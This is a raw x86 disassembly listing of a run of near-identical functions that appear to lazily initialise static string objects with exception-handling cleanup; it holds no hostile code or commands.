  402681:	e8 f0 ea 01 00       	call   0x421176
  402686:	89 f0                	mov    %esi,%eax
  402688:	83 c4 6c             	add    $0x6c,%esp
  40268b:	5e                   	pop    %esi
  40268c:	5f                   	pop    %edi
  40268d:	5b                   	pop    %ebx
  40268e:	5d                   	pop    %ebp
  40268f:	c3                   	ret
  402690:	8b 45 a0             	mov    -0x60(%ebp),%eax
  402693:	3d 01 00 00 00       	cmp    $0x1,%eax
  402698:	76 02                	jbe    0x40269c
  40269a:	0f 0b                	ud2
  40269c:	2d 01 00 00 00       	sub    $0x1,%eax
  4026a1:	ff 24 85 e4 26 40 00 	jmp    *0x4026e4(,%eax,4)
  4026a8:	8b 75 a8             	mov    -0x58(%ebp),%esi
  4026ab:	8b 45 ec             	mov    -0x14(%ebp),%eax
  4026ae:	83 f8 10             	cmp    $0x10,%eax
  4026b1:	72 1f                	jb     0x4026d2
  4026b3:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  4026b6:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  4026b9:	40                   	inc    %eax
  4026ba:	3d 00 10 00 00       	cmp    $0x1000,%eax
  4026bf:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4026c2:	72 06                	jb     0x4026ca
  4026c4:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4026c7:	8b 40 fc             	mov    -0x4(%eax),%eax
  4026ca:	89 04 24             	mov    %eax,(%esp)
  4026cd:	e8 ee 35 00 00       	call   0x405cc0
  4026d2:	c7 45 a4 ff ff ff ff 	movl   $0xffffffff,-0x5c(%ebp)
  4026d9:	89 34 24             	mov    %esi,(%esp)
  4026dc:	e8 13 ea 01 00       	call   0x4210f4
  4026e1:	83 ec 04             	sub    $0x4,%esp
  4026e4:	a8 26                	test   $0x26,%al
  4026e6:	40                   	inc    %eax
  4026e7:	00 55 89             	add    %dl,-0x77(%ebp)
  4026ea:	e5 53                	in     $0x53,%eax
  4026ec:	57                   	push   %edi
  4026ed:	56                   	push   %esi
  4026ee:	83 ec 6c             	sub    $0x6c,%esp
  4026f1:	8a 1d 38 5d 71 00    	mov    0x715d38,%bl
  4026f7:	c7 45 b8 ec 04 42 00 	movl   $0x4204ec,-0x48(%ebp)
  4026fe:	c7 45 bc c4 25 42 00 	movl   $0x4225c4,-0x44(%ebp)
  402705:	89 6d c0             	mov    %ebp,-0x40(%ebp)
  402708:	89 65 c8             	mov    %esp,-0x38(%ebp)
  40270b:	c7 45 c0 c0 27 40 00 	movl   $0x4027c0,-0x40(%ebp)
  402712:	8d 7d 9c             	lea    -0x64(%ebp),%edi
  402715:	89 f8                	mov    %edi,%eax
  402717:	e8 39 ea 01 00       	call   0x421155
  40271c:	84 db                	test   %bl,%bl
  40271e:	75 78                	jne    0x402798
  402720:	c7 45 ec 0f 00 00 00 	movl   $0xf,-0x14(%ebp)
  402727:	c7 45 e8 00 00 00 00 	movl   $0x0,-0x18(%ebp)
  40272e:	c6 45 d8 00          	movb   $0x0,-0x28(%ebp)
  402732:	c7 45 a4 ff ff ff ff 	movl   $0xffffffff,-0x5c(%ebp)
  402739:	8d 75 d4             	lea    -0x2c(%ebp),%esi
  40273c:	89 34 24             	mov    %esi,(%esp)
  40273f:	c7 44 24 04 e3 21 42 	movl   $0x4221e3,0x4(%esp)
  402746:	00 
  402747:	e8 a8 27 00 00       	call   0x404ef4
  40274c:	c7 45 a4 01 00 00 00 	movl   $0x1,-0x5c(%ebp)
  402753:	89 74 24 04          	mov    %esi,0x4(%esp)
  402757:	c7 04 24 1c 5d 71 00 	movl   $0x715d1c,(%esp)
  40275e:	e8 81 f5 ff ff       	call   0x401ce4
  402763:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  402766:	83 f9 10             	cmp    $0x10,%ecx
  402769:	8d 7d 9c             	lea    -0x64(%ebp),%edi
  40276c:	72 17                	jb     0x402785
  40276e:	8b 45 d8             	mov    -0x28(%ebp),%eax
  402771:	41                   	inc    %ecx
  402772:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  402778:	72 03                	jb     0x40277d
  40277a:	8b 40 fc             	mov    -0x4(%eax),%eax
  40277d:	89 04 24             	mov    %eax,(%esp)
  402780:	e8 3b 35 00 00       	call   0x405cc0
  402785:	c7 04 24 e4 13 40 00 	movl   $0x4013e4,(%esp)
  40278c:	e8 17 a5 01 00       	call   0x41cca8
  402791:	c6 05 38 5d 71 00 01 	movb   $0x1,0x715d38
  402798:	83 3d 34 5d 71 00 0f 	cmpl   $0xf,0x715d34
  40279f:	77 07                	ja     0x4027a8
  4027a1:	be 20 5d 71 00       	mov    $0x715d20,%esi
  4027a6:	eb 06                	jmp    0x4027ae
  4027a8:	8b 35 20 5d 71 00    	mov    0x715d20,%esi
  4027ae:	89 3c 24             	mov    %edi,(%esp)
  4027b1:	e8 c0 e9 01 00       	call   0x421176
  4027b6:	89 f0                	mov    %esi,%eax
  4027b8:	83 c4 6c             	add    $0x6c,%esp
  4027bb:	5e                   	pop    %esi
  4027bc:	5f                   	pop    %edi
  4027bd:	5b                   	pop    %ebx
  4027be:	5d                   	pop    %ebp
  4027bf:	c3                   	ret
  4027c0:	8b 45 a0             	mov    -0x60(%ebp),%eax
  4027c3:	3d 01 00 00 00       	cmp    $0x1,%eax
  4027c8:	76 02                	jbe    0x4027cc
  4027ca:	0f 0b                	ud2
  4027cc:	2d 01 00 00 00       	sub    $0x1,%eax
  4027d1:	ff 24 85 14 28 40 00 	jmp    *0x402814(,%eax,4)
  4027d8:	8b 75 a8             	mov    -0x58(%ebp),%esi
  4027db:	8b 45 ec             	mov    -0x14(%ebp),%eax
  4027de:	83 f8 10             	cmp    $0x10,%eax
  4027e1:	72 1f                	jb     0x402802
  4027e3:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  4027e6:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  4027e9:	40                   	inc    %eax
  4027ea:	3d 00 10 00 00       	cmp    $0x1000,%eax
  4027ef:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4027f2:	72 06                	jb     0x4027fa
  4027f4:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4027f7:	8b 40 fc             	mov    -0x4(%eax),%eax
  4027fa:	89 04 24             	mov    %eax,(%esp)
  4027fd:	e8 be 34 00 00       	call   0x405cc0
  402802:	c7 45 a4 ff ff ff ff 	movl   $0xffffffff,-0x5c(%ebp)
  402809:	89 34 24             	mov    %esi,(%esp)
  40280c:	e8 e3 e8 01 00       	call   0x4210f4
  402811:	83 ec 04             	sub    $0x4,%esp
  402814:	d8 27                	fsubs  (%edi)
  402816:	40                   	inc    %eax
  402817:	00 55 89             	add    %dl,-0x77(%ebp)
  40281a:	e5 53                	in     $0x53,%eax
  40281c:	57                   	push   %edi
  40281d:	56                   	push   %esi
  40281e:	83 ec 6c             	sub    $0x6c,%esp
  402821:	8a 1d 58 5d 71 00    	mov    0x715d58,%bl
  402827:	c7 45 b8 ec 04 42 00 	movl   $0x4204ec,-0x48(%ebp)
  40282e:	c7 45 bc d4 25 42 00 	movl   $0x4225d4,-0x44(%ebp)
  402835:	89 6d c0             	mov    %ebp,-0x40(%ebp)
  402838:	89 65 c8             	mov    %esp,-0x38(%ebp)
  40283b:	c7 45 c0 f0 28 40 00 	movl   $0x4028f0,-0x40(%ebp)
  402842:	8d 7d 9c             	lea    -0x64(%ebp),%edi
  402845:	89 f8                	mov    %edi,%eax
  402847:	e8 09 e9 01 00       	call   0x421155
  40284c:	84 db                	test   %bl,%bl
  40284e:	75 78                	jne    0x4028c8
  402850:	c7 45 ec 0f 00 00 00 	movl   $0xf,-0x14(%ebp)
  402857:	c7 45 e8 00 00 00 00 	movl   $0x0,-0x18(%ebp)
  40285e:	c6 45 d8 00          	movb   $0x0,-0x28(%ebp)
  402862:	c7 45 a4 ff ff ff ff 	movl   $0xffffffff,-0x5c(%ebp)
  402869:	8d 75 d4             	lea    -0x2c(%ebp),%esi
  40286c:	89 34 24             	mov    %esi,(%esp)
  40286f:	c7 44 24 04 1a 22 42 	movl   $0x42221a,0x4(%esp)
  402876:	00 
  402877:	e8 78 26 00 00       	call   0x404ef4
  40287c:	c7 45 a4 01 00 00 00 	movl   $0x1,-0x5c(%ebp)
  402883:	89 74 24 04          	mov    %esi,0x4(%esp)
  402887:	c7 04 24 3c 5d 71 00 	movl   $0x715d3c,(%esp)
  40288e:	e8 51 f4 ff ff       	call   0x401ce4
  402893:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  402896:	83 f9 10             	cmp    $0x10,%ecx
  402899:	8d 7d 9c             	lea    -0x64(%ebp),%edi
  40289c:	72 17                	jb     0x4028b5
  40289e:	8b 45 d8             	mov    -0x28(%ebp),%eax
  4028a1:	41                   	inc    %ecx
  4028a2:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  4028a8:	72 03                	jb     0x4028ad
  4028aa:	8b 40 fc             	mov    -0x4(%eax),%eax
  4028ad:	89 04 24             	mov    %eax,(%esp)
  4028b0:	e8 0b 34 00 00       	call   0x405cc0
  4028b5:	c7 04 24 34 14 40 00 	movl   $0x401434,(%esp)
  4028bc:	e8 e7 a3 01 00       	call   0x41cca8
  4028c1:	c6 05 58 5d 71 00 01 	movb   $0x1,0x715d58
  4028c8:	83 3d 54 5d 71 00 0f 	cmpl   $0xf,0x715d54
  4028cf:	77 07                	ja     0x4028d8
  4028d1:	be 40 5d 71 00       	mov    $0x715d40,%esi
  4028d6:	eb 06                	jmp    0x4028de
  4028d8:	8b 35 40 5d 71 00    	mov    0x715d40,%esi
  4028de:	89 3c 24             	mov    %edi,(%esp)
  4028e1:	e8 90 e8 01 00       	call   0x421176
  4028e6:	89 f0                	mov    %esi,%eax
  4028e8:	83 c4 6c             	add    $0x6c,%esp
  4028eb:	5e                   	pop    %esi
  4028ec:	5f                   	pop    %edi
  4028ed:	5b                   	pop    %ebx
  4028ee:	5d                   	pop    %ebp
  4028ef:	c3                   	ret
  4028f0:	8b 45 a0             	mov    -0x60(%ebp),%eax
  4028f3:	3d 01 00 00 00       	cmp    $0x1,%eax
  4028f8:	76 02                	jbe    0x4028fc
  4028fa:	0f 0b                	ud2
  4028fc:	2d 01 00 00 00       	sub    $0x1,%eax
  402901:	ff 24 85 44 29 40 00 	jmp    *0x402944(,%eax,4)
  402908:	8b 75 a8             	mov    -0x58(%ebp),%esi
  40290b:	8b 45 ec             	mov    -0x14(%ebp),%eax
  40290e:	83 f8 10             	cmp    $0x10,%eax
  402911:	72 1f                	jb     0x402932
  402913:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  402916:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  402919:	40                   	inc    %eax
  40291a:	3d 00 10 00 00       	cmp    $0x1000,%eax
  40291f:	8b 45 f0             	mov    -0x10(%ebp),%eax
  402922:	72 06                	jb     0x40292a
  402924:	8b 45 f0             	mov    -0x10(%ebp),%eax
  402927:	8b 40 fc             	mov    -0x4(%eax),%eax
  40292a:	89 04 24             	mov    %eax,(%esp)
  40292d:	e8 8e 33 00 00       	call   0x405cc0
  402932:	c7 45 a4 ff ff ff ff 	movl   $0xffffffff,-0x5c(%ebp)
  402939:	89 34 24             	mov    %esi,(%esp)
  40293c:	e8 b3 e7 01 00       	call   0x4210f4
  402941:	83 ec 04             	sub    $0x4,%esp
  402944:	08 29                	or     %ch,(%ecx)
  402946:	40                   	inc    %eax
  402947:	00 55 89             	add    %dl,-0x77(%ebp)
  40294a:	e5 53                	in     $0x53,%eax
  40294c:	57                   	push   %edi
  40294d:	56                   	push   %esi
  40294e:	83 ec 6c             	sub    $0x6c,%esp
  402951:	8a 1d 78 5d 71 00    	mov    0x715d78,%bl
  402957:	c7 45 b8 ec 04 42 00 	movl   $0x4204ec,-0x48(%ebp)
  40295e:	c7 45 bc e4 25 42 00 	movl   $0x4225e4,-0x44(%ebp)
  402965:	89 6d c0             	mov    %ebp,-0x40(%ebp)
  402968:	89 65 c8             	mov    %esp,-0x38(%ebp)
  40296b:	c7 45 c0 20 2a 40 00 	movl   $0x402a20,-0x40(%ebp)
  402972:	8d 7d 9c             	lea    -0x64(%ebp),%edi
  402975:	89 f8                	mov    %edi,%eax
  402977:	e8 d9 e7 01 00       	call   0x421155
  40297c:	84 db                	test   %bl,%bl
  40297e:	75 78                	jne    0x4029f8
  402980:	c7 45 ec 0f 00 00 00 	movl   $0xf,-0x14(%ebp)
  402987:	c7 45 e8 00 00 00 00 	movl   $0x0,-0x18(%ebp)
  40298e:	c6 45 d8 00          	movb   $0x0,-0x28(%ebp)
  402992:	c7 45 a4 ff ff ff ff 	movl   $0xffffffff,-0x5c(%ebp)
  402999:	8d 75 d4             	lea    -0x2c(%ebp),%esi
  40299c:	89 34 24             	mov    %esi,(%esp)
  40299f:	c7 44 24 04 51 22 42 	movl   $0x422251,0x4(%esp)
  4029a6:	00 
  4029a7:	e8 48 25 00 00       	call   0x404ef4
  4029ac:	c7 45 a4 01 00 00 00 	movl   $0x1,-0x5c(%ebp)
  4029b3:	89 74 24 04          	mov    %esi,0x4(%esp)
  4029b7:	c7 04 24 5c 5d 71 00 	movl   $0x715d5c,(%esp)
  4029be:	e8 21 f3 ff ff       	call   0x401ce4
  4029c3:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  4029c6:	83 f9 10             	cmp    $0x10,%ecx
  4029c9:	8d 7d 9c             	lea    -0x64(%ebp),%edi
  4029cc:	72 17                	jb     0x4029e5
  4029ce:	8b 45 d8             	mov    -0x28(%ebp),%eax
  4029d1:	41                   	inc    %ecx
  4029d2:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  4029d8:	72 03                	jb     0x4029dd
  4029da:	8b 40 fc             	mov    -0x4(%eax),%eax
  4029dd:	89 04 24             	mov    %eax,(%esp)
  4029e0:	e8 db 32 00 00       	call   0x405cc0
  4029e5:	c7 04 24 84 14 40 00 	movl   $0x401484,(%esp)
  4029ec:	e8 b7 a2 01 00       	call   0x41cca8
  4029f1:	c6 05 78 5d 71 00 01 	movb   $0x1,0x715d78
  4029f8:	83 3d 74 5d 71 00 0f 	cmpl   $0xf,0x715d74
  4029ff:	77 07                	ja     0x402a08
  402a01:	be 60 5d 71 00       	mov    $0x715d60,%esi
  402a06:	eb 06                	jmp    0x402a0e
  402a08:	8b 35 60 5d 71 00    	mov    0x715d60,%esi
  402a0e:	89 3c 24             	mov    %edi,(%esp)
  402a11:	e8 60 e7 01 00       	call   0x421176
  402a16:	89 f0                	mov    %esi,%eax
  402a18:	83 c4 6c             	add    $0x6c,%esp
  402a1b:	5e                   	pop    %esi
  402a1c:	5f                   	pop    %edi
  402a1d:	5b                   	pop    %ebx
  402a1e:	5d                   	pop    %ebp
  402a1f:	c3                   	ret
  402a20:	8b 45 a0             	mov    -0x60(%ebp),%eax
  402a23:	3d 01 00 00 00       	cmp    $0x1,%eax
  402a28:	76 02                	jbe    0x402a2c
  402a2a:	0f 0b                	ud2
  402a2c:	2d 01 00 00 00       	sub    $0x1,%eax
  402a31:	ff 24 85 74 2a 40 00 	jmp    *0x402a74(,%eax,4)
  402a38:	8b 75 a8             	mov    -0x58(%ebp),%esi
  402a3b:	8b 45 ec             	mov    -0x14(%ebp),%eax
  402a3e:	83 f8 10             	cmp    $0x10,%eax
  402a41:	72 1f                	jb     0x402a62
  402a43:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  402a46:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  402a49:	40                   	inc    %eax
  402a4a:	3d 00 10 00 00       	cmp    $0x1000,%eax
  402a4f:	8b 45 f0             	mov    -0x10(%ebp),%eax
  402a52:	72 06                	jb     0x402a5a
  402a54:	8b 45 f0             	mov    -0x10(%ebp),%eax
  402a57:	8b 40 fc             	mov    -0x4(%eax),%eax
  402a5a:	89 04 24             	mov    %eax,(%esp)
  402a5d:	e8 5e 32 00 00       	call   0x405cc0
  402a62:	c7 45 a4 ff ff ff ff 	movl   $0xffffffff,-0x5c(%ebp)
  402a69:	89 34 24             	mov    %esi,(%esp)
  402a6c:	e8 83 e6 01 00       	call   0x4210f4
  402a71:	83 ec 04             	sub    $0x4,%esp
  402a74:	38 2a                	cmp    %ch,(%edx)
  402a76:	40                   	inc    %eax
  402a77:	00 55 89             	add    %dl,-0x77(%ebp)
  402a7a:	e5 53                	in     $0x53,%eax
  402a7c:	57                   	push   %edi
  402a7d:	56                   	push   %esi
  402a7e:	83 ec 6c             	sub    $0x6c,%esp
  402a81:	8a 1d 98 5d 71 00    	mov    0x715d98,%bl
  402a87:	c7 45 b8 ec 04 42 00 	movl   $0x4204ec,-0x48(%ebp)
  402a8e:	c7 45 bc f4 25 42 00 	movl   $0x4225f4,-0x44(%ebp)
  402a95:	89 6d c0             	mov    %ebp,-0x40(%ebp)
  402a98:	89 65 c8             	mov    %esp,-0x38(%ebp)
  402a9b:	c7 45 c0 50 2b 40 00 	movl   $0x402b50,-0x40(%ebp)
  402aa2:	8d 7d 9c             	lea    -0x64(%ebp),%edi
  402aa5:	89 f8                	mov    %edi,%eax
  402aa7:	e8 a9 e6 01 00       	call   0x421155
  402aac:	84 db                	test   %bl,%bl
  402aae:	75 78                	jne    0x402b28
  402ab0:	c7 45 ec 0f 00 00 00 	movl   $0xf,-0x14(%ebp)
  402ab7:	c7 45 e8 00 00 00 00 	movl   $0x0,-0x18(%ebp)
  402abe:	c6 45 d8 00          	movb   $0x0,-0x28(%ebp)
  402ac2:	c7 45 a4 ff ff ff ff 	movl   $0xffffffff,-0x5c(%ebp)
  402ac9:	8d 75 d4             	lea    -0x2c(%ebp),%esi
  402acc:	89 34 24             	mov    %esi,(%esp)
  402acf:	c7 44 24 04 7c 22 42 	movl   $0x42227c,0x4(%esp)
  402ad6:	00 
  402ad7:	e8 18 24 00 00       	call   0x404ef4
  402adc:	c7 45 a4 01 00 00 00 	movl   $0x1,-0x5c(%ebp)
  402ae3:	89 74 24 04          	mov    %esi,0x4(%esp)
  402ae7:	c7 04 24 7c 5d 71 00 	movl   $0x715d7c,(%esp)
  402aee:	e8 f1 f1 ff ff       	call   0x401ce4
  402af3:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  402af6:	83 f9 10             	cmp    $0x10,%ecx
  402af9:	8d 7d 9c             	lea    -0x64(%ebp),%edi
  402afc:	72 17                	jb     0x402b15
  402afe:	8b 45 d8             	mov    -0x28(%ebp),%eax
  402b01:	41                   	inc    %ecx
  402b02:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  402b08:	72 03                	jb     0x402b0d
  402b0a:	8b 40 fc             	mov    -0x4(%eax),%eax
  402b0d:	89 04 24             	mov    %eax,(%esp)
  402b10:	e8 ab 31 00 00       	call   0x405cc0
  402b15:	c7 04 24 d4 14 40 00 	movl   $0x4014d4,(%esp)
  402b1c:	e8 87 a1 01 00       	call   0x41cca8
  402b21:	c6 05 98 5d 71 00 01 	movb   $0x1,0x715d98
  402b28:	83 3d 94 5d 71 00 0f 	cmpl   $0xf,0x715d94
  402b2f:	77 07                	ja     0x402b38
  402b31:	be 80 5d 71 00       	mov    $0x715d80,%esi
  402b36:	eb 06                	jmp    0x402b3e
  402b38:	8b 35 80 5d 71 00    	mov    0x715d80,%esi
  402b3e:	89 3c 24             	mov    %edi,(%esp)
  402b41:	e8 30 e6 01 00       	call   0x421176
  402b46:	89 f0                	mov    %esi,%eax
  402b48:	83 c4 6c             	add    $0x6c,%esp
  402b4b:	5e                   	pop    %esi
  402b4c:	5f                   	pop    %edi
  402b4d:	5b                   	pop    %ebx
  402b4e:	5d                   	pop    %ebp
  402b4f:	c3                   	ret
  402b50:	8b 45 a0             	mov    -0x60(%ebp),%eax
  402b53:	3d 01 00 00 00       	cmp    $0x1,%eax
  402b58:	76 02                	jbe    0x402b5c
  402b5a:	0f 0b                	ud2
  402b5c:	2d 01 00 00 00       	sub    $0x1,%eax
  402b61:	ff 24 85 a4 2b 40 00 	jmp    *0x402ba4(,%eax,4)
  402b68:	8b 75 a8             	mov    -0x58(%ebp),%esi
  402b6b:	8b 45 ec             	mov    -0x14(%ebp),%eax
  402b6e:	83 f8 10             	cmp    $0x10,%eax
  402b71:	72 1f                	jb     0x402b92
  402b73:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  402b76:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  402b79:	40                   	inc    %eax
  402b7a:	3d 00 10 00 00       	cmp    $0x1000,%eax
  402b7f:	8b 45 f0             	mov    -0x10(%ebp),%eax
  402b82:	72 06                	jb     0x402b8a
  402b84:	8b 45 f0             	mov    -0x10(%ebp),%eax
  402b87:	8b 40 fc             	mov    -0x4(%eax),%eax
  402b8a:	89 04 24             	mov    %eax,(%esp)
  402b8d:	e8 2e 31 00 00       	call   0x405cc0
  402b92:	c7 45 a4 ff ff ff ff 	movl   $0xffffffff,-0x5c(%ebp)
  402b99:	89 34 24             	mov    %esi,(%esp)
  402b9c:	e8 53 e5 01 00       	call   0x4210f4
  402ba1:	83 ec 04             	sub    $0x4,%esp
  402ba4:	68 2b 40 00 55       	push   $0x5500402b
  402ba9:	89 e5                	mov    %esp,%ebp
  402bab:	53                   	push   %ebx
  402bac:	57                   	push   %edi
  402bad:	56                   	push   %esi
  402bae:	83 ec 6c             	sub    $0x6c,%esp
  402bb1:	8a 1d b8 5d 71 00    	mov    0x715db8,%bl
  402bb7:	c7 45 b8 ec 04 42 00 	movl   $0x4204ec,-0x48(%ebp)
  402bbe:	c7 45 bc 04 26 42 00 	movl   $0x422604,-0x44(%ebp)
  402bc5:	89 6d c0             	mov    %ebp,-0x40(%ebp)
  402bc8:	89 65 c8             	mov    %esp,-0x38(%ebp)
  402bcb:	c7 45 c0 80 2c 40 00 	movl   $0x402c80,-0x40(%ebp)
  402bd2:	8d 7d 9c             	lea    -0x64(%ebp),%edi
  402bd5:	89 f8                	mov    %edi,%eax
  402bd7:	e8 79 e5 01 00       	call   0x421155
  402bdc:	84 db                	test   %bl,%bl
  402bde:	75 78                	jne    0x402c58
  402be0:	c7 45 ec 0f 00 00 00 	movl   $0xf,-0x14(%ebp)
  402be7:	c7 45 e8 00 00 00 00 	movl   $0x0,-0x18(%ebp)
  402bee:	c6 45 d8 00          	movb   $0x0,-0x28(%ebp)
  402bf2:	c7 45 a4 ff ff ff ff 	movl   $0xffffffff,-0x5c(%ebp)
  402bf9:	8d 75 d4             	lea    -0x2c(%ebp),%esi
  402bfc:	89 34 24             	mov    %esi,(%esp)
  402bff:	c7 44 24 04 b6 22 42 	movl   $0x4222b6,0x4(%esp)
  402c06:	00 
  402c07:	e8 e8 22 00 00       	call   0x404ef4
  402c0c:	c7 45 a4 01 00 00 00 	movl   $0x1,-0x5c(%ebp)
  402c13:	89 74 24 04          	mov    %esi,0x4(%esp)
  402c17:	c7 04 24 9c 5d 71 00 	movl   $0x715d9c,(%esp)
  402c1e:	e8 c1 f0 ff ff       	call   0x401ce4
  402c23:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  402c26:	83 f9 10             	cmp    $0x10,%ecx
  402c29:	8d 7d 9c             	lea    -0x64(%ebp),%edi
  402c2c:	72 17                	jb     0x402c45
  402c2e:	8b 45 d8             	mov    -0x28(%ebp),%eax
  402c31:	41                   	inc    %ecx
  402c32:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  402c38:	72 03                	jb     0x402c3d
  402c3a:	8b 40 fc             	mov    -0x4(%eax),%eax
  402c3d:	89 04 24             	mov    %eax,(%esp)
  402c40:	e8 7b 30 00 00       	call   0x405cc0
  402c45:	c7 04 24 24 15 40 00 	movl   $0x401524,(%esp)
  402c4c:	e8 57 a0 01 00       	call   0x41cca8
  402c51:	c6 05 b8 5d 71 00 01 	movb   $0x1,0x715db8
  402c58:	83 3d b4 5d 71 00 0f 	cmpl   $0xf,0x715db4
  402c5f:	77 07                	ja     0x402c68
  402c61:	be a0 5d 71 00       	mov    $0x715da0,%esi
  402c66:	eb 06                	jmp    0x402c6e
  402c68:	8b 35 a0 5d 71 00    	mov    0x715da0,%esi
  402c6e:	89 3c 24             	mov    %edi,(%esp)
  402c71:	e8 00 e5 01 00       	call   0x421176
  402c76:	89 f0                	mov    %esi,%eax
  402c78:	83 c4 6c             	add    $0x6c,%esp
  402c7b:	5e                   	pop    %esi
  402c7c:	5f                   	pop    %edi
  402c7d:	5b                   	pop    %ebx
  402c7e:	5d                   	pop    %ebp
  402c7f:	c3                   	ret
  402c80:	8b 45 a0             	mov    -0x60(%ebp),%eax
  402c83:	3d 01 00 00 00       	cmp    $0x1,%eax
  402c88:	76 02                	jbe    0x402c8c
  402c8a:	0f 0b                	ud2
  402c8c:	2d 01 00 00 00       	sub    $0x1,%eax
  402c91:	ff 24 85 d4 2c 40 00 	jmp    *0x402cd4(,%eax,4)
  402c98:	8b 75 a8             	mov    -0x58(%ebp),%esi
  402c9b:	8b 45 ec             	mov    -0x14(%ebp),%eax
  402c9e:	83 f8 10             	cmp    $0x10,%eax
  402ca1:	72 1f                	jb     0x402cc2
  402ca3:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  402ca6:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  402ca9:	40                   	inc    %eax
  402caa:	3d 00 10 00 00       	cmp    $0x1000,%eax
  402caf:	8b 45 f0             	mov    -0x10(%ebp),%eax
  402cb2:	72 06                	jb     0x402cba
  402cb4:	8b 45 f0             	mov    -0x10(%ebp),%eax
  402cb7:	8b 40 fc             	mov    -0x4(%eax),%eax
  402cba:	89 04 24             	mov    %eax,(%esp)
  402cbd:	e8 fe 2f 00 00       	call   0x405cc0
  402cc2:	c7 45 a4 ff ff ff ff 	movl   $0xffffffff,-0x5c(%ebp)
  402cc9:	89 34 24             	mov    %esi,(%esp)
  402ccc:	e8 23 e4 01 00       	call   0x4210f4
  402cd1:	83 ec 04             	sub    $0x4,%esp
  402cd4:	98                   	cwtl
  402cd5:	2c 40                	sub    $0x40,%al
  402cd7:	00 55 89             	add    %dl,-0x77(%ebp)
  402cda:	e5 53                	in     $0x53,%eax
  402cdc:	57                   	push   %edi
  402cdd:	56                   	push   %esi
  402cde:	83 ec 6c             	sub    $0x6c,%esp
  402ce1:	8a 1d f8 5d 71 00    	mov    0x715df8,%bl
  402ce7:	c7 45 b8 ec 04 42 00 	movl   $0x4204ec,-0x48(%ebp)
  402cee:	c7 45 bc 14 26 42 00 	movl   $0x422614,-0x44(%ebp)
  402cf5:	89 6d c0             	mov    %ebp,-0x40(%ebp)
  402cf8:	89 65 c8             	mov    %esp,-0x38(%ebp)
  402cfb:	c7 45 c0 b0 2d 40 00 	movl   $0x402db0,-0x40(%ebp)
  402d02:	8d 7d 9c             	lea    -0x64(%ebp),%edi
  402d05:	89 f8                	mov    %edi,%eax
  402d07:	e8 49 e4 01 00       	call   0x421155
  402d0c:	84 db                	test   %bl,%bl
  402d0e:	75 78                	jne    0x402d88
  402d10:	c7 45 ec 0f 00 00 00 	movl   $0xf,-0x14(%ebp)
  402d17:	c7 45 e8 00 00 00 00 	movl   $0x0,-0x18(%ebp)
  402d1e:	c6 45 d8 00          	movb   $0x0,-0x28(%ebp)
  402d22:	c7 45 a4 ff ff ff ff 	movl   $0xffffffff,-0x5c(%ebp)
  402d29:	8d 75 d4             	lea    -0x2c(%ebp),%esi
  402d2c:	89 34 24             	mov    %esi,(%esp)
  402d2f:	c7 44 24 04 33 23 42 	movl   $0x422333,0x4(%esp)
  402d36:	00 
  402d37:	e8 b8 21 00 00       	call   0x404ef4
  402d3c:	c7 45 a4 01 00 00 00 	movl   $0x1,-0x5c(%ebp)
  402d43:	89 74 24 04          	mov    %esi,0x4(%esp)
  402d47:	c7 04 24 dc 5d 71 00 	movl   $0x715ddc,(%esp)
  402d4e:	e8 91 ef ff ff       	call   0x401ce4
  402d53:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  402d56:	83 f9 10             	cmp    $0x10,%ecx
  402d59:	8d 7d 9c             	lea    -0x64(%ebp),%edi
  402d5c:	72 17                	jb     0x402d75
  402d5e:	8b 45 d8             	mov    -0x28(%ebp),%eax
  402d61:	41                   	inc    %ecx
  402d62:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  402d68:	72 03                	jb     0x402d6d
  402d6a:	8b 40 fc             	mov    -0x4(%eax),%eax
  402d6d:	89 04 24             	mov    %eax,(%esp)
  402d70:	e8 4b 2f 00 00       	call   0x405cc0
  402d75:	c7 04 24 c4 15 40 00 	movl   $0x4015c4,(%esp)
  402d7c:	e8 27 9f 01 00       	call   0x41cca8
  402d81:	c6 05 f8 5d 71 00 01 	movb   $0x1,0x715df8
  402d88:	83 3d f4 5d 71 00 0f 	cmpl   $0xf,0x715df4
  402d8f:	77 07                	ja     0x402d98
  402d91:	be e0 5d 71 00       	mov    $0x715de0,%esi
  402d96:	eb 06                	jmp    0x402d9e
  402d98:	8b 35 e0 5d 71 00    	mov    0x715de0,%esi
  402d9e:	89 3c 24             	mov    %edi,(%esp)
  402da1:	e8 d0 e3 01 00       	call   0x421176
  402da6:	89 f0                	mov    %esi,%eax
  402da8:	83 c4 6c             	add    $0x6c,%esp
  402dab:	5e                   	pop    %esi
  402dac:	5f                   	pop    %edi
  402dad:	5b                   	pop    %ebx
  402dae:	5d                   	pop    %ebp
  402daf:	c3                   	ret
  402db0:	8b 45 a0             	mov    -0x60(%ebp),%eax
  402db3:	3d 01 00 00 00       	cmp    $0x1,%eax
  402db8:	76 02                	jbe    0x402dbc
  402dba:	0f 0b                	ud2
  402dbc:	2d 01 00 00 00       	sub    $0x1,%eax
  402dc1:	ff 24 85 04 2e 40 00 	jmp    *0x402e04(,%eax,4)
  402dc8:	8b 75 a8             	mov    -0x58(%ebp),%esi
  402dcb:	8b 45 ec             	mov    -0x14(%ebp),%eax
